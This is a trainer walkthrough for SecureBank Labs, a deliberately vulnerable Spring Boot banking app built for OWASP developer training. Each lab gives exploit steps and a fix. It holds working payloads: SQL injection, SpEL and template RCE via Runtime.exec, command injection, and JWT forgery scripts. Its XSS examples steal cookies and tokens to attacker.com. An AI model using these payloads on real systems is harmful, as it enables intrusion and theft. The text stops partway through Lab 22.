# SecureBank Labs — Trainer Walkthrough

> OWASP Top 10 (2025) · 25 Labs · Developer Security Training  
> Internet Banking Application — **Spring Boot 3.3 / PostgreSQL / React**

---

> [!CAUTION]
> **This application is intentionally vulnerable.** Every flaw is deliberate and
> marked in the source with a `// VULN: [Axx-Labyy] ...` comment followed by a
> `// FIX: ...` comment. Do not deploy it anywhere reachable from the internet.

---

## Quick Start

```bash
docker compose up --build
```

Open **http://localhost** — the React banking app loads automatically.

| Service | URL | Purpose |
|---------|-----|---------|
| React Frontend | http://localhost | Banking UI + Lab Panel |
| Core API (Spring Boot) | http://localhost:8080/api | Labs 1–11, 13–25 |
| Report Service (Spring Boot) | http://localhost:8081/api | Lab 12 |
| PostgreSQL | localhost:5432 | `securebank / securebank` |

Seed data is created by Flyway on first container start:

| Username | Password | Role | Account |
|----------|----------|------|---------|
| alice | password123 | customer | #ACC-1001 · £4,200 |
| bob | qwerty | customer | #ACC-1002 · £12,800 |
| admin | admin | admin | — |
| charlie | charlie | customer | #ACC-1003 · £750 |

**Lab panel:** Click any item in the left sidebar under "OWASP LABS" to open a lab
page with tabs: Exploit Steps / Affected Code / Hint / Fix. The *Affected Code* tab
shows the **live Java source**, extracted from the file on disk when the lab
metadata was generated — it is never a hand-copied snippet.

### Getting a token

Almost every exploit needs a bearer token. Get one up front:

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "$TOKEN"
```

---

## Endpoint map

Every lab has its own prefix so that exercises never interfere with each other.

| Prefix | Labs |
|--------|------|
| `/api/a01/accounts`, `/api/a01/admin` | 1, 2, 3 |
| `/api/a02/debug`, `/api/a02/admin`, `/api/a02/exposed-files` | 4, 5, 6 |
| `/api/a04/hashes`, `/api/a04/crack`, `/api/a04/profile` | 7, 8, 9 |
| `/api/a05/auth`, `/api/a05/transfers` | 10, 11, 13 |
| `/api/report/report` (port 8081) | 12 |
| `/api/a06/transfers`, `/api/a06/profile`, `/api/a06/auth` | 14, 15, 16 |
| `/api/a07/auth`, `/api/a07/session` | 17, 18, 19 |
| `/api/a08/integrity`, `/api/a08/kyc-upload` | 20, 22 |
| `/api/a10/transfers` | 23, 24, 25 |

---

## A01 — Broken Access Control

---

### Lab 1 — IDOR: View Another Customer's Account `Low`

**Objective:** Access account #ACC-1002 (bob's) while authenticated as alice.

**Exploit steps:**
1. Log in as `alice / password123` → note alice's account ID in the dashboard
2. Navigate to **My Accounts → Account Detail** — URL is `/banking/accounts/1`
3. Change the URL to `/banking/accounts/2` — bob's full account appears with balance
   and transactions
4. Confirm via API:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/accounts/2
# {"account_number":"ACC-1002","balance":12800.00,...}
```

**Impact:** Any authenticated customer can read every other customer's balance and
full transaction history. In a real bank this is a critical data breach.

**Affected code:** `core/.../lab/a01/Lab1IdorController.java` — `GET /{id}` looks the
account up by primary key and never compares `account.user_id` to the caller.

**Fix:** Compare the account's owner to the authenticated principal before
returning it, and return 404 (not 403) so the endpoint does not confirm that the
id exists.

---

### Lab 2 — Privilege Escalation: Customer → Admin `Medium`

**Objective:** Call the admin user-management endpoint as a regular customer.

**Exploit steps:**
1. Log in as alice and capture the JWT token (previous lab step)
2. Call the admin endpoint directly — the frontend never links to it, but it is
   unprotected:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/admin/users
```
3. Observe the full user list including hashed passwords and email addresses
4. Also try:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a01/admin/accounts
```

**Impact:** Customer can enumerate all users, discover admin accounts, and prepare
further attacks.

**Affected code:** `core/.../lab/a01/Lab2PrivilegeEscalationController.java` —
`/admin/users` checks only that *a* valid JWT exists, never that `role == "admin"`.

**Fix:** Add a role check that returns 403 when the caller's role is not `admin`.
Authorization belongs in one place, applied to every admin route.

---

### Lab 3 — SSRF: Internal Metadata Fetch `High`

**Objective:** Make the server fetch an internal URL you control.

**Exploit steps:**
1. The statement email feature POSTs to `/api/a01/accounts/statement-email`
2. Supply an attacker-controlled callback URL:
```bash
curl -X POST http://localhost:8080/api/a01/accounts/statement-email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"account_id": 1, "callback_url": "http://169.254.169.254/latest/meta-data/"}'
```
3. On cloud infrastructure this returns AWS/GCP instance metadata including IAM
   credentials. Locally the address is unreachable, but the response still reports
   `"sent_to"` — the server *did* make the request from its own network position.
4. Pivot to an internal service that is only reachable by Docker DNS name:
```bash
curl -X POST http://localhost:8080/api/a01/accounts/statement-email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"account_id": 1, "callback_url": "http://report:8081/api/report/report/generate"}'
```
5. The response body is the report service's own output — proof the request came
   from inside the Docker network, from a host that can resolve `report`.

**Impact:** Attacker can pivot to internal services unreachable from the internet —
metadata APIs, internal admin panels, internal databases.

**Affected code:** `core/.../lab/a01/Lab3SsrfController.java` — the callback URL is
used verbatim as the target of a server-side `HttpClient` request, with no scheme
check, no host allowlist and no protection against private, loopback or link-local
address ranges.

**Fix:** Resolve the hostname, reject loopback/private/link-local ranges and the
metadata IP, allow only an explicit allowlist of hosts, and never follow redirects
to an address that was not validated.

---

## A02 — Security Misconfiguration

---

### Lab 4 — Debug Mode: Stack Trace Exposes DB Credentials `Low`

**Objective:** Trigger an unhandled exception to view the application's internals.

**Exploit steps:**
1. The debug endpoint dumps the resolved configuration without authentication:
```bash
curl http://localhost:8080/api/a02/debug
```
   The response contains `jwt.secret`, `spring.datasource.url`,
   `spring.datasource.username` and `spring.datasource.password`.
2. Every unhandled error is equally verbose. Trigger one:
```bash
curl http://localhost:8080/api/a02/debug/boom
```
   The response contains:
   - The full Java stack trace
   - The request path and method
   - A **configuration snapshot** — the same `jwt.secret` and datasource password,
     repeated on every error response
3. The same thing happens on any unexpected endpoint. The stack trace names the
   controller class, the method, the line numbers and the library versions, which
   is a precise map of the codebase.

**Impact:** Any error exposes the full application internals. Knowing `jwt.secret`
means being able to forge tokens (Lab 8) — an error page hands over the keys to
the whole application.

**Affected code:** `core/.../lab/a02/Lab4DebugController.java` and
`core/.../lab/a02/Lab4ErrorController.java` (a `@RestControllerAdvice` that renders
every exception with its stack trace and a config dump), plus
`server.error.include-stacktrace: always` in `application.yml`.

**Fix:** Delete the debug endpoint. Set `server.error.include-stacktrace: never`.
Return a correlation id and a generic message; log the detail server-side only.
Never include configuration values in an error response.

---

### Lab 5 — Default Admin Credentials `Low`

**Objective:** Log into the admin console with default credentials.

**Exploit steps:**
1. Navigate to: **http://localhost/admin-console**
2. Enter `admin / admin`
3. Observe full database-backed access: browse all users, accounts and transfers
4. The same works through the API:
```bash
curl -X POST http://localhost:8080/api/a02/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

**Impact:** Attacker gains full database read/write access through the admin
console without touching any other endpoint.

**Affected code:** `core/.../lab/a02/Lab5DefaultAdminController.java` — the admin
account is seeded with `admin / admin` and the login endpoint performs no lockout
or second factor.

**Fix:** Use strong, unique admin credentials (ideally generated on first run).
Restrict the admin console to an internal network or an IP allowlist. Disable it
in production, or put it behind SSO with MFA.

---

### Lab 6 — Sensitive File Exposure: .env, .git, backup.zip `Medium`

**Exploit steps:**
1. Navigate to `http://localhost/.env` — full environment file with fake
   AWS/Stripe credentials and `JWT_SECRET=secret`
2. Navigate to `http://localhost/.git/config` — git remote URL revealing the
   internal code repository
3. Navigate to `http://localhost/backup.zip` — downloads a **PostgreSQL** backup
   containing every user and transaction
4. Open the backup:
```bash
unzip backup.zip            # securebank.dump
pg_restore -l securebank.dump          # list the contents
pg_restore -d securebank securebank.dump  # restore into a local Postgres
```
5. Find the MD5 password hashes — crack them in the next lab

**Impact:** AWS keys enable cloud account takeover. The database backup bypasses
all API security. The git config reveals internal infrastructure and repository
names.

**Affected code:** `core/.../core/security/WebConfig.java` maps the whole web root
as a static resource handler, including explicit handlers for `/.env` and
`/.git/**`. `core/docker-entrypoint.sh` writes the `pg_dump` output straight into
`/app/static/backup.zip`.

**Fix:** Serve static assets from a dedicated directory that contains only assets.
Never ship a `.env` file or a `.git` directory inside the document root. Never write
database dumps into a directory served by the web server.

---

## A04 — Cryptographic Failures

---

### Lab 7 — MD5 Password Hashing: Crack with Hashcat `Medium`

**Objective:** Crack a user's password from their MD5 hash.

**Exploit steps:**
1. Obtain hashes via the exposed `backup.zip` (Lab 6), via the SQL injection
   (Lab 10), or directly:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/hashes
```
2. Save alice's hash to a file:
```bash
echo "482c811da5d5b4bc6d497ffa98491e38" > hashes.txt
```
3. Crack with hashcat:
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
4. Result: `password123` in seconds (MD5 + no salt = trivially crackable)
5. No hashcat? The lab ships an in-process cracker:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/crack
```

**Note on the hash:** `482c811da5d5b4bc6d497ffa98491e38` is the real MD5 of
`password123`. (Some older versions of this walkthrough listed
`0f359740bd1cda994f8b55330c86d845`, which is **wrong** — that value does not
correspond to `password123` and will not crack.)

**Impact:** All user passwords are compromised within minutes of obtaining any
hash. Unsalted MD5 is not password storage — it is plaintext with extra steps.

**Affected code:** `core/.../core/user/PasswordService.java` — `MessageDigest`
with `MD5`, no salt, no work factor.

**Fix:** Use bcrypt or Argon2id:
`BCrypt.hashpw(password, BCrypt.gensalt(12))` / `BCrypt.checkpw(password, hash)`.
Never use MD5, SHA-1 or SHA-256 alone for passwords.

---

### Lab 8 — Hardcoded Weak JWT Secret: Forge Admin Token `Medium`

**Objective:** Forge a JWT with admin role using the hardcoded secret `"secret"`.

**Exploit steps:**
1. Log in as alice and copy the JWT token
2. Decode it at jwt.io — observe `{"user_id":1,"username":"alice","role":"customer"}`
3. The secret `"secret"` is visible in the startup log:
```bash
docker compose logs backend | grep "JWT signing key"
# JWT signing key loaded (SECRET_KEY=secret)
```
   and in the shipped `application.yml`, and in `/.env`.
4. Forge an admin token:
```bash
python3 - <<'PY'
import base64, json, hmac, hashlib

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user_id": 3, "username": "admin", "role": "admin"}).encode())
sig = b64url(hmac.new(b"secret", f"{header}.{payload}".encode(), hashlib.sha256).digest())
print(f"{header}.{payload}.{sig}")
PY
```
5. Use the forged token:
```bash
curl -H "Authorization: Bearer <forged_token>" http://localhost:8080/api/a01/admin/users
```

**Impact:** Anyone who can read the logs, the source, or the `.env` file can become
admin — authentication is completely bypassed.

**Affected code:** `core/.../core/security/JwtService.java` — the secret comes
from `jwt.secret: "secret"` in the committed `application.yml`, and is printed at
startup.

**Fix:** Generate a cryptographically strong secret
(`python3 -c "import secrets; print(secrets.token_hex(32))"`). Load it only from
the environment or a secret manager. Never commit it, never log it.

---

### Lab 9 — PII in Cleartext API Responses and Logs `Low`

**Exploit steps:**
1. Authenticate and call the profile endpoint:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a04/profile
```
2. The response includes the full account number, sort code, email, balance and
   full name — in plaintext
3. Check the Docker logs to see the same PII written to stdout:
```bash
docker compose logs backend | grep -i "profile"
```
4. If traffic is intercepted over HTTP (no TLS in dev), all of this is visible to
   any network observer

**Impact:** PII in logs persists for years. PII in API responses over HTTP is
visible to any network observer. Violates GDPR / PCI-DSS.

**Affected code:** `core/.../lab/a04/Lab9PiiController.java` — the full account
number and sort code are returned in the response body and logged.

**Fix:** Mask sensitive fields in responses (`ACC-****1001`). Never log PII. Use
TLS in transit. Apply field-level encryption at rest.

---

## A05 — Injection

---

### Lab 10 — SQL Injection: Login Bypass & Data Dump `High`

**Objective:** Bypass authentication and dump the database.

**Exploit steps (login bypass):**
1. At the login form, enter:
   - Username: `admin' --`
   - Password: `anything`
2. The raw SQL becomes:
   `SELECT username, password_hash, email, role, id FROM users WHERE username = 'admin' --' AND password_hash = '...'`
3. The comment skips the password check — login succeeds as admin
4. Same thing via the API:
```bash
curl -X POST http://localhost:8080/api/a05/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' --","password":"anything"}'
```

**Exploit steps (data dump):**
```bash
# The search endpoint concatenates the query into the WHERE clause
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/a05/transfers/search?q='+UNION+SELECT+username,password_hash,email,role,id+FROM+users--"
```
The base query selects **five** columns in this order —
`username, password_hash, email, role, id` — so the `UNION` payload must match that
arity and order exactly, or PostgreSQL rejects it with
*"UNION types bigint and character varying cannot be matched"*.

**Exploit steps (with sqlmap):**
```bash
sqlmap -u "http://localhost:8080/api/a05/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --dbms=postgresql --dump --batch
```

**Exploit steps (enumerate the schema):**
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a05/schema
```

**Impact:** Full database compromise. Authentication bypass gives admin access to
all accounts and transactions.

**Affected code:** `core/.../lab/a05/Lab10SqlInjectionController.java` — the
username and password are concatenated straight into the SQL text and executed with
a plain `Statement`.

**Fix:** Use a `PreparedStatement` with `?` placeholders:
```java
PreparedStatement ps = conn.prepareStatement(
    "SELECT username, password_hash, email, role, id FROM users "
    + "WHERE username = ? AND password_hash = ?");
ps.setString(1, username);
ps.setString(2, PasswordService.md5(password));
```
Never interpolate user input into SQL strings.

---

### Lab 11 — SSTI: SpEL RCE via Transaction Remark `High`

**Objective:** Achieve remote code execution through the transaction remark field.

Spring Expression Language is the Java equivalent of Jinja2 — same class of bug,
same class of outcome.

**Exploit steps:**
1. Add a remark via the API:
```bash
curl -X POST http://localhost:8080/api/a05/transfers/1/remark \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"remark": "7*7"}'
```
2. The response contains `<p>Remark: 49</p>` — expression execution confirmed
3. Escalate to remote code execution. `StandardEvaluationContext` allows type
   references via `T(...)`:
```bash
curl -X POST http://localhost:8080/api/a05/transfers/1/remark \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"remark": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"id\"})"}'
```
4. The response contains `uid=0(root) gid=0(root) groups=0(root)` — the command
   ran on the server, and its output was captured and returned
5. Read any file:
```bash
curl -X POST http://localhost:8080/api/a05/transfers/1/remark \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"remark": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"cat\",\"/etc/passwd\"})"}'
```

**Impact:** Full server-side remote code execution — read files, exfiltrate data,
establish a reverse shell.

**Affected code:** `core/.../lab/a05/Lab11SstiController.java` — the remark is
parsed and evaluated as a SpEL expression with a `StandardEvaluationContext`,
which permits type references and arbitrary method invocation. The rendered result
is also returned inside an HTML fragment, so an expression result can carry a
script payload into the victim's browser.

**Fix:** Never evaluate user input as an expression. If a template is needed, pass
the user value as a *variable* into a fixed template and use
`SimpleEvaluationContext` (or no context at all) so type references and method
invocation are impossible. HTML-escape anything rendered into a page.

---

### Lab 12 — SSTI + OS Command Injection: Report Service `High`

**Objective:** Extract internal config via SSTI, then get RCE via command injection.

This lab runs on a **separate service** at port 8081 — the analogue of the original
Go report service, and the pivot target for Lab 3's SSRF.

**SSTI exploit:**
```bash
# Extract the internal secret key
curl -X POST http://localhost:8081/api/report/report/generate \
  -H "Content-Type: application/json" \
  -d '{"account_id": "1001", "template": "Secret: ${config.secretKey}"}'
# {"output":"Secret: sb-report-internal-secret-9f3a2c", ...}

# The internal database path too
curl -X POST http://localhost:8081/api/report/report/generate \
  -H "Content-Type: application/json" \
  -d '{"account_id": "1001", "template": "DB: ${config.dbPath}"}'
```
The template model is a `TemplateModel` object whose `config` property is the
application's internal `ReportConfig`, so `config.secretKey` resolves straight
through. Note that `T(com.securebank.lab.a05.report.ReportConfig).secretKey` does
**not** work here — `T(...)` yields the `Class`, not the instance, so it has no
`secretKey` property.

Escalate the same template to code execution:
```bash
curl -X POST http://localhost:8081/api/report/report/generate \
  -H "Content-Type: application/json" \
  -d '{"account_id": "1001", "template": "${T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{\"id\"})}"}'
```

**OS Command Injection exploit:**
```bash
# Confirm the command that is being run
curl -X POST http://localhost:8081/api/report/report/date-filter \
  -H "Content-Type: application/json" \
  -d '{"from_date": "2024-01-01", "to_date": "2024-12-31"}'
# The service runs: echo 'From: 2024-01-01 To: 2024-12-31' && date

# Break out of the quoted argument and run 'id'
curl -X POST http://localhost:8081/api/report/report/date-filter \
  -H "Content-Type: application/json" \
  -d '{"from_date": "2024-01-01'"'"' && id && echo '"'"'", "to_date": "2024-12-31"}'
```
The single quote closes the `echo` argument, `&& id` runs as a separate command,
and the trailing `echo '` restores the quoting so the shell command still parses.

Read any file the same way — replace `id` with `cat /etc/passwd`.

**Fix (SSTI):** Never accept user-supplied templates. Render from a fixed set of
server-side templates and pass dynamic values as model attributes. Use
`SimpleEvaluationContext` if you must evaluate expressions.

**Fix (OS Cmd):** Parse and validate the date with a strict formatter
(`LocalDate.parse(value, DateTimeFormatter.ISO_LOCAL_DATE)`), then pass the value
as a separate argument to `ProcessBuilder` — never through `sh -c`.

---

### Lab 13 — Stored XSS: Transaction Notes `Medium`

**Objective:** Store an XSS payload that fires for every user viewing the transfers page.

**Exploit steps:**
1. Log in as alice
2. Submit a transfer with a malicious note:
```bash
curl -X POST http://localhost:8080/api/a05/transfers/send \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account_id":1,"to_account_id":2,"amount":1,"note":"<img src=x onerror=alert(document.cookie)>"}'
```
3. Navigate to **Transfers** in the banking app — the alert fires immediately
4. Log in as bob and navigate to Transfers — the same alert fires for bob too
5. Demonstrate cookie theft with a more realistic payload:
```html
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```
6. The token is stored in `localStorage`, so the payload can read it directly:
```html
<script>fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))</script>
```

**Impact:** Stored XSS executes in every victim's browser. It can steal session
tokens, redirect to phishing pages, or perform actions on behalf of users.

**Affected code:** `core/.../lab/a05/Lab13XssController.java` stores the note
verbatim with no escaping, and `frontend/src/features/banking/TransfersPage.jsx`
renders it with `dangerouslySetInnerHTML={{ __html: txn.note }}`.

**Fix:** Sanitise on write **and** on render. The safest fix is to not use
`dangerouslySetInnerHTML` for user data at all — render it as text
(`<div>{txn.note}</div>`). If HTML must be supported, sanitise with DOMPurify on
the client. Move the token out of `localStorage` into an `httpOnly` cookie.

---

## A06 — Insecure Design

---

### Lab 14 — Business Logic: Negative Transfer Amount `Medium`

**Objective:** Create money from nothing by sending a negative transfer.

**Exploit steps:**
1. Check alice's initial balance (£4,200)
2. Send a negative transfer from bob to alice:
```bash
curl -X POST http://localhost:8080/api/a06/transfers/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account_id": 2, "to_account_id": 1, "amount": -1000}'
```
3. Refresh alice's account — the balance has increased to £5,200
4. Bob's balance also increased (both sides of a negative transfer increase their
   balance)
5. Demonstrate: alice sends `-999999` from her own account to herself → unlimited
   balance

**Impact:** Financial integrity completely compromised. Arbitrary balance
manipulation.

**Affected code:** `core/.../lab/a06/Lab14BusinessLogicController.java` — the
`BigDecimal` amount is never checked with `signum()`, so a negative value flows
straight into the balance update.

**Fix:** Validate at the boundary: `if (amount.signum() <= 0) throw ...`. This is
an **insecure design** flaw because the check was simply never considered during
design — no framework will catch it for you.

---

### Lab 15 — Mass Assignment: Self-Promote to Admin `Medium`

**Objective:** Promote a customer account to admin by exploiting an over-permissive request record.

**Exploit steps:**
1. Log in as alice and get a token
2. PATCH the profile endpoint including the `role` field:
```bash
curl -X PATCH http://localhost:8080/api/a06/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username": "alice", "email": "alice@bank.com", "role": "admin"}'
```
3. Fetch the profile back and confirm `"role":"admin"`
4. Now use the admin endpoints — alice has full admin access

**Impact:** Any user can self-promote to admin. All privileged data and operations
are accessible.

**Affected code:** `core/.../lab/a06/Lab15MassAssignmentController.java` — the
`ProfileUpdateRequest` record binds `role` directly from the request body and
writes it to the user row.

**Fix:** Do not bind privileged fields from user input. Use a dedicated request
record that has no `role` field at all, and treat a role change as a privileged
admin-only operation with its own audited endpoint.

---

### Lab 16 — Account Enumeration via Error Messages `Low`

**Objective:** Enumerate valid usernames using different error messages.

**Exploit steps:**
1. Try logging in with a non-existent user:
```bash
curl -X POST http://localhost:8080/api/a06/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username": "notauser", "password": "anything"}'
# {"error":"User not found"}
```
2. Try with a real user:
```bash
curl -X POST http://localhost:8080/api/a06/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "wrongpassword"}'
# {"error":"Incorrect password"}
```
3. Script username enumeration using this difference:
```python
import requests
wordlist = ["alice", "bob", "admin", "charlie", "dave"]
for user in wordlist:
    r = requests.post("http://localhost:8080/api/a06/auth/login/",
                      json={"username": user, "password": "x"})
    if "Incorrect password" in r.text:
        print(f"[+] Valid user: {user}")
```

**Impact:** Attacker can build a list of valid usernames for targeted brute-force,
phishing or credential-stuffing attacks.

**Affected code:** `core/.../lab/a06/Lab16EnumerationController.java` — the
not-found and bad-password branches return different messages.

**Fix:** Return `{"error":"Invalid credentials"}` for both cases. Timing should also
be equalised to prevent timing-based enumeration.

---

## A07 — Authentication Failures

---

### Lab 17 — Brute-Force Login: No Rate Limiting `Low`

**Objective:** Brute-force alice's password with no lockout in place.

**Exploit steps:**
```bash
# Using hydra
hydra -l alice -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/api/a07/auth/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 64

# Or using a simple Python script:
python3 -c "
import requests
with open('/usr/share/wordlists/common-passwords.txt') as f:
    for line in f:
        pw = line.strip()
        r = requests.post('http://localhost:8080/api/a07/auth/login',
                          json={'username':'alice','password':pw})
        if 'token' in r.text:
            print('Found:', pw); break
"
```
3. The attempts are counted but never enforced:
```bash
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/a07/auth/attempts
```

**Impact:** Given no lockout, an attacker will find a password eventually. Common
passwords like `password123` are found in seconds.

**Affected code:** `core/.../lab/a07/Lab17BruteForceController.java` — the login
endpoint increments an attempt counter and returns it, but never blocks or delays.

**Fix:** Add rate limiting (Bucket4j or a filter), implement account lockout after
N failures, and add a CAPTCHA for web-facing login forms.

---

### Lab 18 — Session Fixation `Medium`

**Objective:** Pre-set a session ID before login and hijack the session after authentication.

**Exploit steps:**
1. Obtain a session ID *before* authenticating:
```bash
curl -c cookies.txt -X POST http://localhost:8080/api/a07/session/init
# {"session_id":"<JSESSIONID>", ...}
```
2. Log in **using that same session** — the app does NOT regenerate the session ID
   on login:
```bash
curl -c cookies.txt -b cookies.txt -X POST http://localhost:8080/api/a07/auth/login-session \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}'
```
3. Use the same cookie from another browser/client:
```bash
curl -b cookies.txt http://localhost:8080/api/a07/session/whoami
# {"username":"alice", ...}
```
4. The session ID from step 1 is now an authenticated session — check that the
   `session_id` in the response is the *same* one you started with.

**Impact:** Any attacker who can set a victim's cookie (via XSS, network
interception, or link injection) can fully take over the authenticated session.

**Affected code:** `core/.../lab/a07/Lab18SessionController.java` — the login
handler authenticates the user but never calls `request.changeSessionId()`, so the
pre-existing `JSESSIONID` survives the privilege change.

**Fix:** Call `request.changeSessionId()` (or invalidate and create a new
`HttpSession`) immediately after successful authentication, and rotate the session
on every privilege change.

---

### Lab 19 — Insecure Password Reset: Predictable Token `High`

**Objective:** Compute a valid password reset token without access to the target's email.

**Exploit steps:**
1. Request a reset for alice:
```bash
curl -X POST http://localhost:8080/api/a07/auth/reset-request \
  -H "Content-Type: application/json" \
  -d '{"username": "alice"}'
# {"token":"<md5>", ...}   (echoed for lab convenience)
```
2. Compute the token offline — the attacker knows the username and roughly when
   the request was made:
```python
import hashlib, time
username = "alice"
# Try timestamps within a 60-second window around the request
for offset in range(-30, 31):
    ts = int(time.time()) + offset
    print(hashlib.md5(f"{username}{ts}".encode()).hexdigest())
```
3. Submit the computed token:
```bash
curl -X POST http://localhost:8080/api/a07/auth/reset-confirm \
  -H "Content-Type: application/json" \
  -d '{"token": "<computed_token>", "new_password": "hacked"}'
# {"password_reset": true}
```
4. Log in with the new password.

**Impact:** The attacker can reset any user's password knowing only their username
and the approximate time of the reset request.

**Affected code:** `core/.../lab/a07/Lab19ResetController.java` — the token is
`MD5(username + epochSecond)` with a ±60 second validity window, and it is echoed
back in the response.

**Fix:** Use `secrets.token_urlsafe(32)` for cryptographically random tokens. Store
them hashed, with a one-hour expiry, and delete after a single use. Do not return
the token in the response body.

---

## A08 — Software & Data Integrity Failures

---

### Lab 20 — Insecure Deserialization: Jackson RCE `High`

**Objective:** Achieve remote code execution by uploading a malicious payload file.

This is the Java equivalent of the Python pickle lab: a deserialiser that is
allowed to instantiate an arbitrary class turns a data file into a code execution
primitive.

**Exploit steps:**
1. The endpoint deserialises an uploaded file with an `ObjectMapper` that has
   polymorphic default typing enabled, so the document itself chooses the class:
```bash
curl -X POST http://localhost:8080/api/a08/integrity/import-account/describe \
  -H "Authorization: Bearer $TOKEN"
# {"default_typing":"enabled (LaissezFaireSubTypeValidator)","type_property":"@class", ...}
```
2. Create the payload — the `@class` property names the gadget class, and the
   `command` property is what it executes:
```python
import json
payload = {
    "@class": "com.securebank.lab.a08.gadget.AccountImportJob",
    "command": "id",
}
with open('payload.json', 'w') as f:
    json.dump(payload, f)
```
3. Upload it:
```bash
curl -X POST http://localhost:8080/api/a08/integrity/import-account \
  -H "Authorization: Bearer $TOKEN" \
  -F "data=@payload.json"
```
4. The response contains the captured output of the command:
```json
{"imported": true, "deserialized_type": "com.securebank.lab.a08.gadget.AccountImportJob",
 "command": "id", "command_output": "uid=0(root) gid=0(root) groups=0(root)"}
```
5. Escalate to a reverse shell by changing the `command` value.

> **Why a local gadget class?** The classic payload for this bug is the
> commons-collections `InvokerTransformer` chain. Jackson 2.17 added a hard-coded
> deny list in `BeanDeserializerFactory` that refuses to instantiate
> `InvokerTransformer` regardless of the configured `PolymorphicTypeValidator`, so
> that payload no longer works out of the box. The lab therefore ships its own
> gadget (`AccountImportJob`, whose creator constructor runs a command) to
> demonstrate the same class of bug. The lesson is unchanged: a deserialiser that
> lets the document pick the class is code execution.

**Impact:** Arbitrary code execution on the server with the application's
privileges — full container compromise, lateral movement possible.

**Affected code:** `core/.../lab/a08/Lab20DeserializationController.java` —
`vulnerableMapper` is built with `activateDefaultTyping(LaissezFaireSubTypeValidator,
EVERYTHING, As.PROPERTY)`, and `readValue(content, Object.class)` lets the document
name the class to instantiate.

**Fix:** Never enable default typing on an `ObjectMapper` that reads untrusted
input. Parse into a concrete type, or use a `JsonTypeInfo` with a closed allowlist
of subtypes. Log the detail server-side and return a generic error to the client.

---

### Lab 21 — JWT Algorithm Confusion: alg:none Bypass `Medium`

**Objective:** Forge an admin JWT by stripping the signature and setting `alg: none`.

**Exploit steps:**
1. Get any valid JWT from login
2. Decode the header and payload (base64url)
3. Forge an admin token with `alg: none`:
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 3, "username": "admin", "role": "admin"}
forged = f"{b64url(header)}.{b64url(payload)}."   # empty signature
print(forged)
```
4. Use the forged token:
```bash
curl -H "Authorization: Bearer <forged_token>" http://localhost:8080/api/a01/admin/users
```

**Impact:** Complete authentication bypass — any client can claim any identity
including admin.

**Affected code:** `core/.../core/security/JwtService.java` — `decode()` splits
the token manually and, when the header's `alg` is `none`, parses the payload and
returns it **without verifying anything**. jjwt itself rejects `alg: none`, so the
vulnerable path is implemented by hand.

**Fix:** Never implement JWT verification yourself. Use the library's strict
verification path, which pins the algorithm (`algorithms=["HS256"]`) and refuses
`alg: none`. Reject any token whose header algorithm is not the expected one,
*before* looking at the payload.

---

### Lab 22 — Unverified File Upload `High`

**Objective:** Upload a file of any type and have it served back from the web root.

**Exploit steps:**
1. Upload a file:
```bash
echo "SHELL_HERE" > shell.txt
curl -X POST http://localhost:8080/api/a08/kyc-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.txt"
# {"uploaded": true, "original_filename": "shell.txt", "url": "/uploads/shell.txt", ...}
```
2. Access the uploaded file directly — it is served from the web root:
```bash
curl http://localhost:8080/uploads/shell.txt
# SHELL_HERE
```
3. Upload an HTML file with JavaScript and open it in a browser — it executes as
   the application's origin:
```bash
cat > payload.html <<'HTML'
<script>alert(document.domain)</script>
HTML
curl -X POST http://localhost:8080/api/a08/kyc-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.html"
# then browse to http://localhost:8080/uploads/payload.html
```
4. Demonstrate path traversal — the filename is used verbatim, so `../../` escapes
   the upload directory:
```bash
curl -X POST http://localhost:8080/api/a08/kyc-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.txt;filename=../../shell.txt"
```
5. List what is in the upload directory:
```bash
curl -X GET http://localhost:8080/api/a08/kyc-upload -H "Authorization: Bearer $TOKEN"
```

